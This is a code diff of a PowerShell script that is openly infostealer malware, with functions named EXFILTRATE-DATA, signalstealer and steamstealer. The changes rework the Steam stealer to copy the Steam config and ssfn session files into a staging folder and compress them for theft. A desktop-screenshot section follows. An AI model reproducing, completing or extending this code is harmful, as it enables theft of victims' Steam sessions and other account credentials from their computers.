@@ -1,4 +1,4 @@
-﻿function CHECK_IF_ADMIN {
+function CHECK_IF_ADMIN {
     $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
 }
 
@@ -135,7 +135,7 @@ function EXFILTRATE-DATA {
      }
      signalstealer 
 	 
-	 # Steam Session Stealer
+     # Steam Session Stealer
 	 function steamstealer {
          $processName = "steam"
          try {
@@ -149,11 +149,15 @@ function EXFILTRATE-DATA {
          New-Item -ItemType Directory -Force -Path $steam_session
          $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
          Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
-		 (gci -path $steamfolder -Include "*.ssnf", -r) | Copy-Item -Destination $steam_session -Force
+		 $ssfnfiles = @("ssfn$1")
+         foreach($file in $ssfnfiles) {
+         Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
+         }
+
 		  $steam_zip = "$env:localappdata\temp\steam-session.zip"
          Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
-        }
-      steamstealer 
+         }
+       steamstealer 
      
     
 	# Desktop screenshot
